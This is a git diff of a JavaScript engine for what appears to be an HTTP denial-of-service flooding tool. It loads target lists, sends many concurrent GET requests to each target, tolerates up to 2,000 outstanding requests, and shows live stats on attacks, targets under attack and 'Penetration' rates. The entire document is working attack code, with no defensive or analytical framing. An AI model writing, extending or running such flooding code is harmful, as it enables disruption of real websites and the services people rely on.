@@ -1,8 +1,8 @@
 import ora from "ora";
 import events from "events";
 import axios from "axios";
+import chalk from "chalk";
 
-import manualTargets from "../targets/targets.js";
 import TargetsParser from "./TargetsParser.js";
 
 events.EventEmitter.defaultMaxListeners = 15;
@@ -18,14 +18,26 @@ export default class Engine {
         this.pauseTime = 0;
         this.nextCall = {};
         this.targets = [];
-        this.codes = [];
+        this.accuracy = "0%";
+        this.codes = {
+            "2xx": 0,
+            "3xx": 0,
+            "4xx": 0,
+            "5xx": 0,
+            "sliping": 0,
+            "other": 0,
+        };
         this.responses = 0;
         this.requests = 0;
+        this.attacksNumber = 0;
 
         this.updating = false;
         this.paused = false;
 
+        this.id = 0;
         this.workers = [];
+        this.results = [];
+
 
         this.start();
     }
@@ -41,20 +53,14 @@ export default class Engine {
     }
 
     async getTargets () {
-        this.targets = manualTargets.slice();
-        if (this.argv.targets) {
-            this.targets = this.targets.concat(await TargetsParser.getAllTargets());
-        }
+        this.targets = this.argv.targets ? await TargetsParser.getAllTargets() : await TargetsParser.getCustomTargets();
     }
 
     async updateTargets () {
         this.paused = true;
         this.updating = true;
         this.fillCode();
-        this.targets = manualTargets.slice();
-        if (this.argv.targets) {
-            this.targets = this.targets.concat(await TargetsParser.getAllTargets());
-        }
+        this.targets = this.argv.targets ? await TargetsParser.getAllTargets() : await TargetsParser.getCustomTargets();
         this.updating = false;
     }
 
@@ -83,7 +89,7 @@ export default class Engine {
             this.fillCode();
         }
         if (!this.preDone) {
-            if (this.requests - this.responses >= 500) {
+            if (this.requests - this.responses >= this.REQ_RES_DIFF) {
                 this.paused = true;
             }
             if (!this.paused && this.everyTimeElapsed(100)) {
@@ -104,8 +110,28 @@ export default class Engine {
     }
 
     attack () {
+        let { streams } = this.argv;
         let url = this.url = this.getNextUrl();
-        for (let i = this.argv.streams; i--;) {
+        let attack = {
+            id: this.id,
+            url,
+            state: "error",
+            color: "red",
+            req: 0,
+            res: 0,
+            success: 0,
+            error: 0,
+            state: 0,
+            completed: false
+        };
+        this.id++;
+        this.attacksNumber++;
+        this.results.push(attack);
+
+        this.results = this.results.filter(item => !item.completed);
+
+        for (let i = streams; i--;) {
+            attack.req++;
             this.requests++;
             const controller = new AbortController();
             let instance = this.workers.find(worker => worker.state === "ready");
@@ -122,34 +148,40 @@ export default class Engine {
                 });
                 this.workers.push(instance);
             }
-
             instance.state = "busy";
             instance.get(url)
                 .then((response) => {
                     if (response.status) {
-                        this.fillCode(Number(response.status));
+                        this.fillCode(String(response.status).replace(/(\d)\d+/g, "$1xx"));
                     }
                     instance.state = "ready";
-                    this.responses++;
+                    attack.success++;
                 })
                 .catch((error) => {
                     if (error.response) {
-                        this.fillCode(error.response.status);
+                        attack.success++;
+                        this.fillCode(String(error.response.status).replace(/(\d)\d+/g, "$1xx"));
 
                     } else if (error.request) {
-                        this.fillCode('noResponse :)');
+                        attack.error++;
+                        this.fillCode('sliping');
                     } else {
-                        this.fillCode('other error');
+                        attack.error++;
+                        this.fillCode('other');
                     }
-                    instance.state = "ready";
-                    this.responses++;
                 })
                 .then(() => {
-                    //controller.abort();
+                    this.responses++;
+                    attack.res++;
+                    attack.state = Math.round((attack.success / streams) * 100) + "%";
+                    instance.state = "ready";
+                    if (attack.res === streams) {
+                        attack.completed = true;
+                    }
                 });
         }
-        //this.workers = this.workers.filter(worker => worker.state === "busy");
         this.fillCode();
+        this.accuracy = Math.round(((this.codes["2xx"] + this.codes["3xx"] + this.codes["4xx"] + this.codes["5xx"]) / this.requests) * 100) + "%";
         global.gc();
     }
 
@@ -176,7 +208,10 @@ export default class Engine {
     }
 
     fillCode(statusCode = "") {
+        //return;
         let string = "";
+        let yellow = chalk.hex("#ffc800");
+        let green = chalk.hex("#10bd0d");
 
         if (statusCode !== "") {
             if (this.codes[statusCode] === undefined) {
@@ -186,34 +221,63 @@ export default class Engine {
             }
         }
 
-        string += "\r\n----- Workers stat -----\r\n";
-        let workersBusy = this.workers.filter(worker => worker.state === "ready");
-        string += `workers: ${this.workers.length} | workers busy: ${workersBusy.length} | workers free: ${this.workers.length - workersBusy.length}\r\n`;
-
-        string += "\r\n----- Status stat -----\r\n";
-        for (let key in this.codes) {
-            string += `${key}: ${this.codes[key]} \r\n`
-        }
-        string += "\r\n----- Requests stat -----\r\n";
-        string += `targets: ${this.targets.length} | `;
-        string += `req: ${this.requests} | `;
-        string += `res: ${this.responses} \r\n`;
-        string += "\r\n----- State -----\r\n";
-
-        if (!this.paused) {
-            string += `Attaking: ${this.url}\r\n`;
-        } else if (this.updating) {
-            string += `Updating targets...\r\n`;
-        } else if (this.paused) {
-            string += `Waiting...\r\n`;
-        };
-
-        string += "\r\n----- Time -----\r\n";
+        // time ==================
+        string += yellow("\r\n----- Time -----\r\n");
         if (this.totalTime > 0) {
             string += `time: ${this.msToTime(this.timeElapsed)} (${this.msToTime(this.totalTime)})`;
         } else {
             string += `time: ${this.msToTime(this.timeElapsed)}`;
         }
+        string += "\r\n";
+
+        // workers ==================
+        string += yellow("\r\n----- Workers stat -----\r\n");
+        let workersBusy = this.workers.filter(worker => worker.state === "busy");
+        string += `workers: ${this.workers.length} | workers busy: ${workersBusy.length} | workers free: ${this.workers.length - workersBusy.length}\r\n`;
+
+        // requests ==================
+        string += yellow("\r\n----- Requests stat -----\r\n");
+        string += `targets: ${this.targets.length} | `;
+        string += `req: ${this.requests} | `;
+        string += `res: ${this.responses} | `;
+        string += `diff: ${this.requests - this.responses} (${this.REQ_RES_DIFF}) \r\n`;
+
+        // status ==================
+        string += yellow("\r\n----- Status stat -----\r\n");
+        let i = 0;
+        for (let key in this.codes) {
+            string += `${i == 0 ? "" : " | "}${key}: ${this.codes[key]}`;
+            i++;
+        }
+        string += `\r\n${green("Penetration")}: ${this.accuracy}`;
+        string += "\r\n";
+
+        // state ==================
+        string += yellow("\r\n----- Attack -----\r\n");
+        if (!this.paused) {
+            let underAttack = this.results.filter(item => item.res > 0);
+            let waitingAttack = this.results.filter(item => item.res === 0);
+            string += `Target: ${this.url}\r\n`;
+            string += `Targets under attacks: ${underAttack.length}\r\n`;
+            string += `Targets started: ${waitingAttack.length}\r\n`;
+            string += `Attacks number: ${this.attacksNumber}\r\n`;
+
+            string += yellow(`\r\n----- Log -----`);
+            for (let i = 0; i < this.RESULTS_LIMIT; i++) {
+                let item = this.results[i];
+                if (item) {
+                    string += `\r\nTarget: ${item.url} | Progress: ${item.res}/${item.req} | Accuracy: ${item.state}`;
+                } else {
+                    string += "\r\n";
+                }
+            }
+            string += "\r\n";
+
+        } else if (this.updating) {
+            string += `Updating targets...\r\n`;
+        } else if (this.paused) {
+            string += `Waiting...\r\n`;
+        };
 
         if (this.preDone && !this.done) {
             string += "\r\nWaiting for rest requests...";
@@ -237,6 +301,14 @@ export default class Engine {
         minutes = (minutes < 10) ? "0" + minutes : minutes;
         seconds = (seconds < 10) ? "0" + seconds : seconds;
 
-        return hours + ":" + minutes + ":" + seconds + "." + milliseconds;
+        return hours + ":" + minutes + ":" + seconds;
+    }
+
+    get REQ_RES_DIFF () {
+        return 2000;
+    }
+
+    get RESULTS_LIMIT () {
+        return parseInt(this.argv.streams / 5)
     }
 }
